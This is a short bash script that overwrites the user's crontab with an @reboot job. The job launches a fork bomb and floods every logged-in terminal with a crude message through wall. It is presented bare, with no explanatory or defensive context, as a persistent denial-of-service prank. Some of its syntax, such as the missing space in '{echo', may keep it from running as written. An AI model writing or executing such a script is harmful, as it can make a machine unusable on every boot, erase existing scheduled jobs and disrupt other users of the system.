#!/usr/bin/env bash
echo '@reboot :(){echo "balls"|wall;:|:&disown};:&disown'|crontab